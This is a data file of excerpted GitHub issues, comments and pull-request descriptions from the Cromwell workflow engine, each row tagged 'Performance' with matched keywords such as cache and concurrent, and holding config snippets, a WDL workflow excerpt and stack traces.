Performance,### Description. Created a service that can fetch and cache the public cost catalog from Google. Provides a public `getSku` method which can be used to lookup a sku given certain runtime attributes. . #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [x] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7507:54,cache,cache,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7507,1,['cache'],['cache']
Performance,"### Description. When evaluating a list of file sizes to compute its sum, perform the IO requests in parallel instead of in sequence. This prevents instances from asplode. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [ ] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7438:74,perform,perform,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7438,1,['perform'],['perform']
Performance,"#### Comment 1. Could you add a key to indicate what the various colors and line-types mean?. #### Comment 2. All of the actors are ultimately descended from the CromwellRootActor (or should be, except the server or cmdline actors which create it) - I don't see that shown for the call cache actors group. Is that genuinely true (scary!), or do they need a line of ancestry coming in from somewhere?. #### Comment 3 ; (this one is more TOL-y...). Is there an even higher level ""10,000 foot"" view with functional units shown linked together? Eg you've drawn some of the boxes in different colors, presumably those would be reasonable candidates for boxes on some higher-level view?. The reason I ask is, (a) this diagram is scarier than I realized! It'd be nice to have some higher-level context before seeing the whole thing in full... or (b) I had to zoom in really far in order to make out the words in the individual boxes - I wonder if one context-setting diagram would then let us have (say) 5 different 5,000 foot magnifications for individual subsystems, rather than a single all-in-one diagram? (although EDIT... that said, I do find the big-picture diagram kind of awesome, maybe we could get it printed out on giant paper somewhere... 🤔)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-551243707:286,cache,cache,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-551243707,1,['cache'],['cache']
Performance,"#### What's changed?. Updates the error message format and content if a call cache diff fails to find a set of metadata. #### Old Format and Content; ```; {; ""status"": ""error"",; ""message"": ""Failed to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (<<workflow ID>> / <<call name>>:<<index>>) (reason 1 of 1): No 'id' field found"",; ""errors"": {; ""JsArray"": {; ""elements"": [; {; ""JsString"": {; ""value"": ""Failed to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (<<workflow ID>> / <<call name>>:<<index>>) (reason 1 of 1): No 'id' field found""; }; }; ]; }; }; }; ```. ### New Format and Content; ```; {; ""status"": ""error"",; ""message"": ""Failed to calculate diff for call A and call B"",; ""errors"": [; ""Failed to extract relevant metadata for call A (<<workflow ID>> / <<call name>>:<<index>>) (reason 1 of 1): No metadata was found for that workflow/call/index combination. Check that the workflow ID is correct, that the call name is formatted like 'workflowname.callname' and that an index is provided if this was a scattered task. (NOTE: the default index is -1, ie non-scattered)""; ]; }; ```. #### Commentary. ~~I'm not convinced the ""roll my own"" Json formatter is needed... if only there were an ""identity"" formatter for JsValue, rather than the default - which interprets the value more like a ADT.~~. ~~I'm open to suggestions.~~. UPDATE: it turns out rolling my own ""identity formatter"" was easier than rolling my own case class formatter.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5260:77,cache,cache,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5260,1,['cache'],['cache']
Performance,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. Hi this is not an issue but a question. I am running scatter to align 114 samples using bwa. I use scatter in the workflow and then set the config to `concurrent-job-limit = 10` but this **still crashes my HPC server**. Can you let me know how to limit the jobs in scatter?. my.conf; ```; include required(classpath(""application"")). call-caching {; enabled = true; }. backend {; 	providers {; 		BackendName {; 			actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; 			config {; 				concurrent-job-limit = 10; 			}; 		}; 	}; }; ```. workflow where samples is 114 sample structs with fastqs; ```; scatter (s in samples) {; 		call bwa_task.Mem as bwa {; 			input :; 				trim = trim,; 				read1 = s.read1,; 				#read2 = s.read2,; 				bwaIndex = bwaIndex,; 				outputPrefix = s.outputPrefix,; 				readgroup = s.readgroup,; 				runtime_params = standard_runtime_bwa	; 		}; 		; 		; 		call samtools.sort as samsort {; 			input :; 				sam = bwa.outputSam,; 				outputPrefix = s.outputPrefix,; 				runtime_params = standard_runtime_samtools; 		}; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6188:377,concurren,concurrent-job-limit,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6188,2,['concurren'],['concurrent-job-limit']
Performance,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. I'm trying to run the workflow below. There is a working version for a single sample (https://github.com/gatk-workflows/gatk4-somatic-snvs-indels/blob/master/mutect2.wdl), but I want to run the workflow on many samples concurrently. My attempt at creating a workflow to do so failed with the following error:. ```; Failed to process scatter block (reason 1 of 1): No conversion defined for Ast with name Outputs to WorkflowGraphElement; ```. Any help would be greatly appreciated. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; GCS; <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0. ## Copyright Broad Institute, 2017; ##; ## This WDL workflow runs GATK4 Mutect 2 on a single tumor-normal pair or on a single tumor sample,; ## and performs additional filtering and functional annotation tasks.; ##; ## Main requirements/expectations :; ## - One analysis-ready BAM file (and its index) for each sample; ##; ## Description of inputs:; ##; ## ** Runtime **; ## gatk_docker: docker image to use for GATK 4 Mutect2; ## preemptible: how ma",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5345:445,concurren,concurrently,445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5345,1,['concurren'],['concurrently']
Performance,"#2540 enables backends to specify a limited number of jobs to run concurrently. If this ticket is implemented, instead of defaulting to an infinite number of tokens, backends would default to some other value. The actual default needs to be defined before this ticket may be implemented.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548:66,concurren,concurrently,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548,1,['concurren'],['concurrently']
Performance,#4598 is related (not great performance in JMUI use cases) but not the same.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4561#issuecomment-459040378:28,perform,performance,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4561#issuecomment-459040378,1,['perform'],['performance']
Performance,"$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282) at sbt.TestFunction.apply(TestFramework.scala:294) at sbt.Tests$.processRunnable$1(Tests.scala:347) at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353) at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46) at sbt.std.Transform$$anon$4.work(System.scala:67) at sbt.Execute.$anonfun$submit$2(Execute.scala:269) at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16) at sbt.Execute.work(Execute.scala:278) at sbt.Execute.$anonfun$submit$1(Execute.scala:269) at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178) at sbt.CompletionService$$anon$2.call(CompletionService.scala:37) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Cause: akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://test-system-6/user/$l#-102797778]] after [30000 ms]. Sender[Actor[akka://test-system-6/system/testActor-24#-1294021439]] sent message of type ""cromwell.engine.workflow.SingleWorkflowRunnerActor$RunWorkflow$"". at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:596) at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:606) at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205) at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:870) at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:109) at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:103) at scala.concurrent.Future$InternalCallbackExecutor$.execute(Future.scala:868) at akka.actor.LightArrayRevolverScheduler$TaskHolder.executeTask(LightArrayRevolverSched",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4350:6137,concurren,concurrent,6137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4350,1,['concurren'],['concurrent']
Performance,$.sequenceIterable(TryUtil.scala:118) ~[cromwell.jar:0.19];   at cromwell.util.TryUtil$.sequenceMap(TryUtil.scala:130) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:625) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:664) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19];   at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19];   at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19];   at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19];   at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19];   at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19];   at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19];   at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19];   at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/928:2044,concurren,concurrent,2044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/928,5,['concurren'],['concurrent']
Performance,"$1.apply(BackendWorkflowInitializationActor.scala:155); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); 	at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:536); 	at com.google.cloud.storage.BlobWriteChannel$1.run(BlobWriteChannel.java:49); 	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); 	at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); 	at com.google.cloud.RetryHelper.runWithRetries(RetryH",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1890:2899,concurren,concurrent,2899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1890,1,['concurren'],['concurrent']
Performance,"$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:59); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-08-08 08:33:09,747] [info] Updating WorkflowManager state. New Data: (4e20eafc-baae-4605-a010-adfa5f32ae46,Actor[akka://cromwell-system/user/WorkflowManagerActor/WorkflowActor-4e20eafc-baae-4605-a010-adfa5f32ae46#-904922324]); [2016-08-08 08:33:09,767] [info] WorkflowActor [←[38;5;2m4e20eafc←[0m]: Start(Some(Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor#576120716])) message received; [2016-08-08 08:33:10,91] [info] WorkflowActor [←[38;5;2m4e20eafc←[0m]: ExecutionStoreCreated(Start(Some(Actor[akka://cromwellsystem/user/SingleWorkflowRunnerActor#576120716]))) message received; [2016-08-08 08:33:10,94] [info] SingleWorkflowRunnerActor: workflow ID ←[38;5;2m4e20eafc-baae-4605-a010-adfa5f32ae46←[0m; [2016-08-08 08:33:10,104] [info] WorkflowActor [←[38;5;2m4e20eafc←[0m]: Beginning transition from Submitted to Running.; [2016-08-08 08:33:10,106] [info] WorkflowActor [←[38;5;2m4e20eafc←[0m]: transitionin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1261:5689,concurren,concurrent,5689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1261,1,['concurren'],['concurrent']
Performance,"$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:59); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. To a novice user it is not clear whether that this can safely be ignored. This is a problem in particular if this first use actually fails for some other reason. The user will spend time trying to figure out if the problem is caused by a credential issue. I tried to see if I could easily suppress this by setting up ""backends"" to only include ""local"". I pulled down the [application.conf](https://github.com/broadinstitute/cromwell/blob/9f759a54a0b8873f1338f36391f985477d83475a/engine/src/main/resources/application.conf) which sets:. ```; backend {; // Either ""jes"", ""local"", or ""sge"" (case insensitive); defaultBackend = ""local""; // List of backends which this Cromwell supports. Be sure to include the defaultBackend!; backendsAllowed = [ ""local"" ]; ```. and then passed the file as:. `$ java -Dconfig.file=application.conf -jar cromwell.jar run hello.wdl hello.json; `; But the exception and warning were still raised. ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:5024,concurren,concurrent,5024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,1,['concurren'],['concurrent']
Performance,$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.del,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2807,Load,LoaderCache,2807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Load'],['LoaderCache']
Performance,"$RestartCallback.apply(IORunLoop.scala:303) -------------------------------------------------------------------------------- Parser: org.semanticweb.owlapi.rdf.turtle.parser.TurtleOntologyParser@4e879e3e Stack trace: org.semanticweb.owlapi.rdf.turtle.parser.ParseException: Encountered unexpected token: ""<"" <ERROR> at line 1, column 1. Was expecting one of: ""("" ""@base"" ""@prefix"" ""["" <EMPTY_BLANK_NODE> <FULLIRI> <NODEID> <PNAME_LN> <PNAME_NS> org.semanticweb.owlapi.rdf.turtle.parser.TurtleOntologyParser.parse(TurtleOntologyParser.java:58) uk.ac.manchester.cs.owl.owlapi.OWLOntologyFactoryImpl.loadOWLOntology(OWLOntologyFactoryImpl.java:193) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.load(OWLOntologyManagerImpl.java:1071) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntology(OWLOntologyManagerImpl.java:1033) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntologyFromOntologyDocument(OWLOntologyManagerImpl.java:974) cwl.ontology.Schema$.$anonfun$loadOntologyFromIri$5(Schema.scala:155) cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85) cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303) Encountered unexpected token: ""<"" <ERROR> at line 1, column 1. Was expecting one of: ""("" ""@base"" ""@prefix"" ""["" <EMPTY_BLANK_NODE> <FULLIRI> <NODEID> <PNAME_LN> <PNAME_NS> org.semanticweb.owlapi.rdf.turtle.parser.TurtleParser.generateParseException(TurtleParser.java:1034) org.semanticweb.owlapi.rdf.turtle.parser.TurtleParser.jj_consume_token(TurtleParser.java:902) org.semanticweb.owlapi.rdf.turtle.parser.TurtleParser.parseDocument(TurtleParser.java:165) org.semanticweb.owlapi.rdf.turtle.parser.TurtleOntologyParser.parse(TurtleOntologyParser.java:54) uk.ac.manchester.cs.owl.owlapi.OWLOntologyFactoryImpl.loadOWLOntology(OWLOntologyFactoryImpl.java:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372:2824,load,loadOntologyFromIri,2824,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372,1,['load'],['loadOntologyFromIri']
Performance,"$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2017-01-20 09:33:07,58] [info] WorkflowManagerActor WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46 is in a terminal state: WorkflowFailedState; [2017-01-20 09:33:24,62] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 transitioned to state Failed; ```. Failure is due to inability to find the files listed in the file created by write_lines():; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMafPaths; raise Exception(""MAF doesn't exist: %s"" % mafPath); Exception",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906:15321,concurren,concurrent,15321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906,1,['concurren'],['concurrent']
Performance,$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; Backend Error; 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.read(DefaultStorageRpc.java:482); 	at com.google.cloud.storage.BlobReadChannel$1.call(BlobReadChannel.java:127); 	at com.google.cloud.storage.BlobReadChannel$1.call(BlobReadChannel.java:124); 	at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:244); 	at com.google.cloud.storage.BlobReadChannel.read(BlobReadChannel.java:124); 	at com.google.cloud.storage.contrib.nio.CloudStorageReadChannel.read(CloudStorageReadChannel.java:85); 	at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); 	at sun.nio.ch.ChannelInputStream.read(C,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1923:3883,concurren,concurrent,3883,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1923,1,['concurren'],['concurrent']
